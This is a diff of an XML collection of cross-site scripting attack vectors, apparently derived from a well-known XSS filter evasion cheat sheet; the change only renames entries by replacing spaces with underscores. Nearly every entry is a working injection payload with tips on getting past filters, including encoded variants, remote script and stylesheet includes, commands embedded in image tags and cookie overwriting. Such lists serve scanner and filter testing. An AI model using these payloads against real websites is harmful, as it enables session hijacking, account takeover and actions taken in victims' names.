@@ -1,7 +1,7 @@
 <?xml version="1.0"?>
 <xss>
 	<attack>
-		<name>XSS Locator</name>
+		<name>XSS_Locator</name>
 		<code>&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{}</code>
 
 		<desc>Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word &quot;XSS&quot; will pop up.  You&apos;ll need to replace the &quot;&amp;&quot; with &quot;%26&quot; if you are submitting this XSS string via HTTP GET or it will be ignored and everything after it will be interpreted as another variable.  Tip: If you&apos;re in a rush and need to quickly check a page, often times injecting the deprecated &quot;&lt;PLAINTEXT&gt;&quot; tag will be enough to check to see if something is vulnerable to XSS by messing up the output appreciably.</desc>
@@ -11,7 +11,7 @@
 
 	</attack>
 	<attack>
-		<name>XSS Quick Test</name>
+		<name>XSS_Quick_Test</name>
 		<code>&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}</code>
 		<desc>If you don&apos;t have much space, this string is a nice compact XSS injection check. View source after injecting it and look for &lt;XSS versus &amp;lt;XSS to see if it is vulnerable.</desc>
 
@@ -20,7 +20,7 @@
 
 	</attack>
 	<attack>
-		<name>SCRIPT w/Alert()</name>
+		<name>SCRIPT_w/Alert()</name>
 		<code>&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;</code>
 		<desc>Basic injection attack</desc>
 
@@ -29,7 +29,7 @@
 
 	</attack>
 	<attack>
-		<name>SCRIPT w/Source File</name>
+		<name>SCRIPT_w/Source_File</name>
 		<code>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;</code>
 		<desc>No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here).</desc>
 		<label>Basic XSS Attacks</label>
@@ -38,7 +38,7 @@
 
 	</attack>
 	<attack>
-		<name>SCRIPT w/Char Code</name>
+		<name>SCRIPT_w/Char_Code</name>
 		<code>&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code>
 		<desc>Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word &quot;XSS&quot; will pop up.</desc>
 
@@ -65,7 +65,7 @@
 
 	</attack>
 	<attack>
-		<name>BODY background-image</name>
+		<name>BODY_background-image</name>
 		<code>&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>BODY image</desc>
 		<label>HTML Element Attacks</label>
@@ -74,7 +74,7 @@
 
 	</attack>
 	<attack>
-		<name>BODY ONLOAD</name>
+		<name>BODY_ONLOAD</name>
 		<code>&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</code>
 		<desc>BODY tag (I like this method because it doesn&apos;t require using any variants of &quot;javascript:&quot; or &quot;&lt;SCRIPT...&quot; to accomplish the XSS attack)</desc>
 
@@ -83,7 +83,7 @@
 
 	</attack>
 	<attack>
-		<name>DIV background-image 1</name>
+		<name>DIV_background-image_1</name>
 		<code>&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</code>
 		<desc>Div background-image</desc>
 		<label>HTML Element Attacks</label>
@@ -92,7 +92,7 @@
 
 	</attack>
 	<attack>
-		<name>DIV background-image 2</name>
+		<name>DIV_background-image_2</name>
 		<code>&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;</code>
 		<desc>Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)</desc>
 
@@ -101,7 +101,7 @@
 
 	</attack>
 	<attack>
-		<name>DIV expression</name>
+		<name>DIV_expression</name>
 		<code>&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;</code>
 		<desc>Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and &quot;expression&quot;</desc>
 
@@ -128,7 +128,7 @@
 
 	</attack>
 	<attack>
-		<name>INPUT Image</name>
+		<name>INPUT_Image</name>
 		<code>&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>INPUT Image</desc>
 
@@ -137,7 +137,7 @@
 	</attack>
 
 	<attack>
-		<name>IMG w/JavaScript Directive</name>
+		<name>IMG_w/JavaScript_Directive</name>
 		<code>&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>Image XSS using the JavaScript directive.</desc>
 		<label>HTML Element Attacks</label>
@@ -146,7 +146,7 @@
 
 	</attack>
 	<attack>
-		<name>IMG No Quotes/Semicolon</name>
+		<name>IMG_No_Quotes/Semicolon</name>
 		<code>&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</code>
 		<desc>No quotes and no semicolon</desc>
 		<label>HTML Element Attacks</label>
@@ -155,7 +155,7 @@
 
 	</attack>
 	<attack>
-		<name>IMG Dynsrc</name>
+		<name>IMG_Dynsrc</name>
 		<code>&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>IMG Dynsrc</desc>
 		<label>HTML Element Attacks</label>
@@ -164,7 +164,7 @@
 
 	</attack>
 	<attack>
-		<name>IMG Lowsrc</name>
+		<name>IMG_Lowsrc</name>
 		<code>&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>IMG Lowsrc</desc>
 		<label>HTML Element Attacks</label>
@@ -173,7 +173,7 @@
 
 	</attack>
 	<attack>
-		<name>IMG Embedded commands 1</name>
+		<name>IMG_Embedded_commands_1</name>
 		<code>&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</code>
 		<desc>This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.</desc>
 		<label>HTML Element Attacks</label>
@@ -182,7 +182,7 @@
 
 	</attack>
 	<attack>
-		<name>IMG Embedded commands 2</name>
+		<name>IMG_Embedded_commands_2</name>
 		<code>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser</code>
 		<desc>IMG Embedded commands part II - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal &lt;IMG SRC=&quot;http://badguy.com/a.jpg&quot;&gt; could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).</desc>
 
@@ -191,7 +191,7 @@
 
 	</attack>
 	<attack>
-		<name>IMG STYLE w/expression</name>
+		<name>IMG_STYLE_w/expression</name>
 		<code>exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
 xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</code>
 
@@ -210,7 +210,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>IMG w/VBscript</name>
+		<name>IMG_w/VBscript</name>
 		<code>&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</code>
 		<desc>VBscript in an image</desc>
 		<label>HTML Element Attacks</label>
@@ -237,7 +237,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>US-ASCII encoding</name>
+		<name>US-ASCII_encoding</name>
 		<code>%BCscript%BEalert(%A2XSS%A2)%BC/script%BE</code>
 		<desc>Found by Kurt Huwig http://www.iku-ag.de/ This uses malformed ASCII encoding with 7 bits instead of 8.  This XSS may bypass many content filters but only works if the hosts transmits in US-ASCII encoding, or if you set the encoding yourself.  This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion.  Apache Tomcat is the only known server that transmits in US-ASCII encoding.</desc>
 		<label>HTML Element Attacks</label>
@@ -254,7 +254,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>META w/data:URL</name>
+		<name>META_w/data:URL</name>
 		<code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</code>
 		<desc>This is nice because it also doesn&apos;t have anything visibly that has the word SCRIPT or the JavaScript directive in it, since it utilizes base64 encoding. Please see http://www.ietf.org/rfc/rfc2397.txt for more details</desc>
 
@@ -263,7 +263,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>META w/additional URL parameter</name>
+		<name>META_w/additional_URL_parameter</name>
 		<code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>Meta with additional URL parameter. If the target website attempts to see if the URL contains an &quot;http://&quot; you can evade it with the following technique (Submitted by Moritz Naumann http://www.moritz-naumann.com)</desc>
 
@@ -290,7 +290,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>OBJECT w/Embedded XSS</name>
+		<name>OBJECT_w/Embedded_XSS</name>
 		<code>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;</code>
 		<desc>Using an OBJECT tag you can embed XSS directly (this is unverified).</desc>
 
@@ -298,7 +298,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 		<browser>Browser support:</browser>
 	</attack>
 	<attack>
-		<name>Embed Flash</name>
+		<name>Embed_Flash</name>
 		<code>&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;</code>
 
 		<desc>Using an EMBED tag you can embed a Flash movie that contains XSS. If you add the attributes allowScriptAccess=&quot;never&quot; and allownetworking=&quot;internal&quot; it can mitigate this risk (thank you to Jonathan Vanasco for the info). Demo: http://ha.ckers.org/weird/xssflash.html :</desc>
@@ -307,7 +307,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>OBJECT w/Flash 2</name>
+		<name>OBJECT_w/Flash_2</name>
 		<code>a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);</code>
 
 		<desc>Using this action script inside flash can obfuscate your XSS vector.</desc>
@@ -325,7 +325,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>STYLE w/Comment</name>
+		<name>STYLE_w/Comment</name>
 		<code>&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;</code>
 		<desc>STYLE attribute using a comment to break up expression (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one)</desc>
 		<label>HTML Element Attacks</label>
@@ -334,16 +334,16 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>STYLE w/Anonymous HTML</name>
+		<name>STYLE_w/Anonymous_HTML</name>
 		<code>&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;</code>
 		<desc>Anonymous HTML with STYLE attribute (IE and Netscape 8.1+ in IE rendering engine mode don&apos;t really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter)</desc>
 
-		<label>HTML Element Attacks</label>
+		<label>HTML_Element_Attacks</label>
 		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
 
 	</attack>
 	<attack>
-		<name>STYLE w/background-image</name>
+		<name>STYLE_w/background-image</name>
 		<code>&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</code>
 
 		<desc>STYLE tag using background-image.</desc>
@@ -352,7 +352,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>STYLE w/background</name>
+		<name>STYLE_w/background</name>
 		<code>&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;</code>
 
 		<desc>STYLE tag using background.</desc>
@@ -370,7 +370,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>Remote Stylesheet 1</name>
+		<name>Remote_Stylesheet_1</name>
 		<code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;</code>
 		<desc>Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode.  Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won&apos;t work unless there is some content on the page other than the vector itself, so you&apos;ll need to add a single letter to the page to make it work if it&apos;s an otherwise blank page.</desc>
 
@@ -379,7 +379,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>Remote Stylesheet 2</name>
+		<name>Remote_Stylesheet_2</name>
 		<code>&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;</code>
 		<desc>Remote style sheet part 2 (this works the same as above, but uses a &lt;STYLE&gt; tag instead of a &lt;LINK&gt; tag). A slight variation on this vector was used to hack Google Desktop http://www.hacker.co.il/security/ie/css_import.html.  As a side note you can remote the end STYLE tag if there is HTML immediately after the vector to close it.  This is useful if you cannot have either an equal sign or a slash in your cross site scripting attack, which has come up at least once in the real world.</desc>
 
@@ -388,7 +388,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>Remote Stylesheet 3</name>
+		<name>Remote_Stylesheet_3</name>
 		<code>&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;</code>
 		<desc>Remote style sheet part 3. This only works in Opera but is fairly tricky.  Setting a link header is not part of the HTTP1.1 spec. However, some browsers still allow it (like Firefox and Opera).  The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: &lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox.</desc>
 
@@ -397,7 +397,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>Remote Stylesheet 4</name>
+		<name>Remote_Stylesheet_4</name>
 		<code>&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;</code>
 		<desc>Remote style sheet part 4.  This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites.</desc>
 
@@ -424,7 +424,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>XML namespace</name>
+		<name>XML_namespace</name>
 		<code>&lt;HTML xmlns:xss&gt;
 &lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;
 &lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
@@ -436,7 +436,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>XML data island w/CDATA</name>
+		<name>XML_data_island_w/CDATA</name>
 		<code>&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;
 
 &lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;</code>
@@ -446,7 +446,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>XML data island w/comment</name>
+		<name>XML_data_island_w/comment</name>
 		<code>&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
 
 &lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;</code>
@@ -457,7 +457,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>XML (locally hosted)</name>
+		<name>XML(locally-hosted)</name>
 		<code>&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
 &lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</code>
 
@@ -467,7 +467,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>XML HTML+TIME</name>
+		<name>XML_HTML+TIME</name>
 		<code>&lt;HTML&gt;&lt;BODY&gt;
 &lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;
 
@@ -480,7 +480,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>Commented-out Block</name>
+		<name>Commented-out_Block</name>
 		<code>&lt;!--[if gte IE 4]&gt;
 &lt;SCRIPT&gt;alert(&apos;XSS&apos;);&lt;/SCRIPT&gt;
 &lt;![endif]--&gt;</code>
@@ -491,7 +491,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>Cookie Manipulation</name>
+		<name>Cookie_Manipulation</name>
 		<code>&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;</code>
 
 		<desc>Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where &lt;META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim&apos;s cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).</desc>
@@ -500,7 +500,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>Local .htc file</name>
+		<name>Local_.htc_file</name>
 		<code>&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;</code>
 		<desc>This uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute.</desc>
 		<label>Other Attacks</label>
@@ -509,7 +509,7 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 
 	</attack>
 	<attack>
-		<name>Rename .js to .jpg</name>
+		<name>Rename_.js_to_.jpg</name>
 		<code>&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</code>
 		<desc>Assuming you can only fit in a few characters and it filters against &quot;.js&quot; you can rename your JavaScript file to an image as an XSS vector.</desc>
 
@@ -537,7 +537,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>JavaScript Includes</name>
+		<name>JavaScript_Includes</name>
 		<code>&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;</code>
 		<desc>&amp;JavaScript includes (works in Netscape 4.x).</desc>
 		<label>Other Attacks</label>
@@ -546,7 +546,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Character Encoding Example</name>
+		<name>Character_Encoding_Example</name>
 		<code>&lt;
 %3C
 &amp;lt
@@ -627,7 +627,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 		<browser>Browser support:</browser>
 	</attack>
 	<attack>
-		<name>Case Insensitive</name>
+		<name>Case_Insensitive</name>
 		<code>&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</code>
 		<desc>Case insensitive XSS attack vector.</desc>
 
@@ -636,7 +636,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>HTML Entities</name>
+		<name>HTML_Entities</name>
 		<code>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</code>
 		<desc>HTML entities (the semicolons are required for this to work).</desc>
 		<label>Character Encoding Attacks</label>
@@ -645,7 +645,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Grave Accents</name>
+		<name>Grave_Accents</name>
 		<code>&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;</code>
 		<desc>Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don&apos;t know about grave accents).</desc>
 
@@ -654,7 +654,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Image w/CharCode</name>
+		<name>Image_w/CharCode</name>
 		<code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code>
 		<desc>If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need.</desc>
 		<label>Character Encoding Attacks</label>
@@ -662,7 +662,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>UTF-8 Unicode Encoding</name>
+		<name>UTF-8_Unicode_Encoding</name>
 		<code>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</code>
 
 		<desc>UTF-8 Unicode encoding (all of the XSS examples that use a javascript: directive inside of an IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).</desc>
@@ -671,7 +671,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Long UTF-8 Unicode w/out Semicolons</name>
+		<name>Long_UTF-8_Unicode_w/out_Semicolons</name>
 		<code>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</code>
 
 		<desc>Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for "&amp;#XX;", since most people don&apos;t know about padding - up to 7 numeric characters total).  This is also useful against people who decode against strings like $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate an html encoded string (I&apos;ve seen this in the wild).</desc>
@@ -680,7 +680,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>DIV w/Unicode</name>
+		<name>DIV_w/Unicode</name>
 		<code>&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;</code>
 		<desc>DIV background-image with unicoded XSS exploit (this has been modified slightly to obfuscate the url parameter).  The original vulnerability was found by Renaud Lifchitz (http://www.sysdream.com) as a vulnerability in Hotmail.</desc>
 		<label>Character Encoding Attacks</label>
@@ -689,7 +689,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Hex Encoding w/out Semicolons</name>
+		<name>Hex_Encoding_w/out_Semicolons</name>
 		<code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</code>
 
 		<desc>Hex encoding without semicolons (this is also a viable XSS attack against the above string $tmp_string = ~ s/.*\&amp;#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).</desc>
@@ -698,7 +698,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>UTF-7 Encoding</name>
+		<name>UTF-7_Encoding</name>
 		<code>&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-</code>
 
 		<desc>UTF-7 encoding - if the page that the XSS resides on doesn&apos;t provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one). You don&apos;t need the charset statement if the user&apos;s browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 IE rendering engine mode). Watchfire  http://seclists.org/lists/fulldisclosure/2005/Dec/1107.html found this hole in Google&apos;s custom 404 script.</desc>
@@ -707,7 +707,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Escaping JavaScript escapes</name>
+		<name>Escaping_JavaScript_escapes</name>
 		<code>\&quot;;alert(&apos;XSS&apos;);//</code>
